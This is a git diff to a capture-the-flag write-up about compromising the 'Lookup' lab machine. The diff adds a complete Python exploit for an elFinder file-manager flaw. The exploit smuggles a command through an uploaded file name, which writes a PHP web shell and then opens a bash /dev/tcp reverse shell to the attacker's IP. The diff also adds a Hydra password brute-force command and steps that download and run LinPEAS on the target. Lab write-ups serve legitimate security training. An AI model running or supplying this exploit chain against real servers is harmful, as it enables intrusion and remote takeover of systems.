@@ -84,15 +84,14 @@ With a known valid username (e.g. `jose`), the next step was to find the correct
 The tool **Hydra** was used to automate this process against the web login form. Hydra can perform an HTTP POST login attempt for each password in a list and detect success or failure by matching on response strings. Using Hydra, the command format was as follows:
 
 ```bash
-hydra -l jose -P /usr/share/wordlists/rockyou.txt \
-      http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password"
+hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password"
 ```
 
 This tells Hydra to try the username “jose” (`-l jose`) with each password in `rockyou.txt` (`-P` specifies the password list). The `http-post-form` module is configured with the login URL and parameters. The string after the colon describes how to send the POST: `username=^USER^&password=^PASS^` (Hydra will substitute ^USER^ and ^PASS^ with the current username and password). After the final colon, `F=Wrong password` indicates the failure condition – Hydra will treat any response containing “Wrong password” as an indication that the login failed. (By contrast, a different response would likely mean a successful login, since the application only says “Wrong password” on failure).
 
 Using this method (or an equivalent Python script), the correct password was eventually found. For example, let’s assume the password turned out to be **`password123`** (a hypothetical outcome from the RockYou list). Once Hydra identified the correct credentials (`jose:password123`), it was possible to log into the web application successfully.
 
-**Inside the web interface:** Upon logging in at `http://lookup.thm/login.php` with the found credentials, the application redirected to **`http://files.lookup.thm/`**. This suggests the main site (`lookup.thm`) served a login and then handed off to a subdomain hosting a file management panel. In the browser, the interface on `files.lookup.thm` was revealed to be **elFinder**, a web-based file manager. The presence of elFinder was significant because it’s a publicly known software, and specifically, certain versions of elFinder have known vulnerabilities.
+**Inside the web interface:** Upon logging in at `http://lookup.thm/login.php` with the found credentials, the application redirected to **`http://files.lookup.thm/`** (add it to /etc/hosts now to reach the page). This suggests the main site (`lookup.thm`) served a login and then handed off to a subdomain hosting a file management panel. In the browser, the interface on `files.lookup.thm` was revealed to be **elFinder**, a web-based file manager. The presence of elFinder was significant because it’s a publicly known software, and specifically, certain versions of elFinder have known vulnerabilities.
 
 At this stage, it’s worth noting how the pieces are interacting: the login application likely validated credentials (perhaps against a database) and then allowed access to the file manager hosted on the separate virtual host. The user `jose` likely had permissions to use this file manager. The focus thus shifted to the **elFinder** interface, looking for ways to further exploit the system from there.
 
@@ -110,14 +109,72 @@ In simpler terms, an authenticated attacker (or sometimes even unauthenticated, 
 
 Using this exploit, the attacker effectively gained the ability to execute arbitrary commands on the target as the **web server user** (which on Ubuntu/Apache is typically `www-data`). To get an interactive foothold, a **reverse shell** was initiated. This was done by instructing the web shell to execute a common payload: a one-liner to open a network connection back to the attacker’s machine and pipe it to a shell. For example, using PHP’s `system()` to call a bash one-liner or using a tool like Netcat. In practice, the Python exploit could be configured to automatically start a listener and send a reverse shell payload.
 
-**Reverse shell details:** The exploit script accepted parameters for the attacker’s IP and port (denoted as `-lh <LocalHost>` and `-lp <LocalPort>` in the command usage). For instance:
+**Reverse shell details:** [The exploit script accepted parameters for the attacker’s IP and port](https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce) (denoted as `-lh <LocalHost>` and `-lp <LocalPort>` in the command usage). For instance:
+```python3
+import requests
+import base64
+import json
 
+# === CONFIG PERSONNELLE ===
+target = "http://files.lookup.thm/elFinder/"
+lhost = "10.8.181.99"     # Ton IP (netcat)
+lport = "1337"            # Ton port d’écoute
+
+# === Désactive les warnings SSL (si HTTPS utilisé un jour)
+requests.packages.urllib3.disable_warnings()
+
+# === Étape 1 : Construire l’URL correcte
+if not target.endswith("/"):
+    target += "/"
+upload_url = target + "php/connector.minimal.php"
+rotate_url_template = target + "php/connector.minimal.php?target={}&degree=180&mode=rotate&cmd=resize"
+shell_url = target + f"php/rse.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261'"
+
+# === Étape 2 : Charger une image (fichier base64 inclus dans le script)
+print("[+] Préparation de l'image")
+img_base64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxIQEg8PEhIPFRIPDw8QEA8QDw8PEBAPFREWFhUVFRUYHSggGBolHRUVITEhJSkrLi4uFx8zODMsNygtLisBCgoKDg0NFQ8PFSsdFR0tLS0tKysrKy0tKy0tNy03LS0rKy0tLSsrKzc3LS0rLSsrKy0rKzctLTcrLSstNy0tK//AABEIAQMAwgMBIgACEQEDEQH/xAAbAAABBQEBAAAAAAAAAAAAAAADAAECBAUGB//EAD8QAAIBAgMFBQUGBQIHAQAAAAECAAMRBCExBRJBUWEGMnGBkRMiUqHRFGJyscHwQpKisuEjkxUXM3OC0vEH/8QAGQEBAQEBAQEAAAAAAAAAAAAAAAECAwUE/8QAIBEBAQEAAwADAAMBAAAAAAAAAREBAgMSITFBEyJRBP/aAAwDAQACEQMRAD8Aynwi9IL7OvMSVRjzlVmPOenHy0VlURiyyFOnvQVZbRCo1yLWygvY6AamBqtnFTrG/wBZrylEr0rG1jfj4wJuIcNBuIiIpCMYMCTtLBAx1iIkgYBUQDNj5DWWFxxA3V90dNT4mVAt5MLwiFTepeIRboEleESUSwlpXTOEBgWywGkmmkqpDqYQYGFVjAAyYMotI8IHlRHhleQWN6KDiiDJOHaROEaWTfnI36xGqDSw7AxqmFMs70FUPWSFZ1XByK4E9JaaNeaQFsLbOBenLhcQTOIFYUo5WHLwZIgD3YgIQgSFpUqQMYtGiiB1kxICTUQJqIRFjbto6mQFEmpggZJGgWVMKryqrQo8P3BocCBlY2hvIHN5c3RlbSgkX1JFUVVFU1RbJ2MnXSk7ID8+Cg=="
+img_bytes = base64.b64decode(img_base64)
+
+# === Étape 3 : Upload avec payload
+print("[+] Upload de l'image piégée...")
+payload_name = "image.jpg;echo 3c3f7068702073797374656d28245f524551554553545b2263225d293b203f3e0a | xxd -r -p > rse.php; #.jpg"
+data = {
+    "cmd": "upload",
+    "target": "l1_Lw"
+}
+files = {
+    "upload[]": (payload_name, img_bytes, "image/jpeg")
+}
+
+response = requests.post(upload_url, data=data, files=files, verify=False)
+
+try:
+    file_hash = response.json()["added"][0]["hash"]
+    print(f"[+] Fichier uploadé avec succès ! hash = {file_hash}")
+except Exception as e:
+    print("[-] Échec de l'upload :")
+    print(response.text)
+    exit(1)
+
+# === Étape 4 : Déclencher l'exécution du nom → création de rse.php
+print("[+] Déclenchement de l'exécution (rotate)...")
+rotate_url = rotate_url_template.format(file_hash)
+requests.get(rotate_url, verify=False)
+
+# === Étape 5 : Appel de la webshell PHP → reverse shell
+print(f"[+] Appel de rse.php pour reverse shell vers {lhost}:{lport} ...")
+requests.get(shell_url, verify=False)
+
+print("[+] Terminé ! Regarde ton terminal Netcat :)")
+
+
+```
 ```bash
 # On the attacker machine, set up a netcat listener for the shell:
 nc -lvnp 1337
 
 # Run the exploit script to target the elFinder endpoint:
-python3 exploit_elfinder.py -t "http://files.lookup.thm/elFinder/" -lh 10.8.181.99 -lp 1337
+python3 exploit_elfinder.py 
 ```
 
 This would cause the target to connect back to IP `10.8.181.99` on port `1337` (which should be the attacker’s VPN IP and a port of choice). Once the exploit succeeded, the waiting Netcat listener on the attacker side showed a connection, and an interactive **shell prompt** appeared. The shell was running with user **`www-data`** privileges, confirming that we had remote code execution as the Apache service account.
@@ -133,14 +190,17 @@ With a foothold as `www-data`, a thorough enumeration of the target’s system w
 To transfer files like LinPEAS to the target, one can use various methods. A simple approach is hosting a file on a local HTTP server and using `wget` or `curl` on the target to download it. For example, on the attacker machine:
 
 ```bash
+# Download linpeas.sh into your pwd.
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
+
 # Host the current directory over HTTP (Python 3's built-in module):
-python3 -m http.server 80
+python3 -m http.server 555 #A different port of Apache one
 ```
 
 And on the target (via the reverse shell):
 
 ```bash
-wget http://10.8.181.99/linpeas.sh -O /tmp/linpeas.sh
+wget http://10.8.181.99:555/linpeas.sh -O /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh
 ```
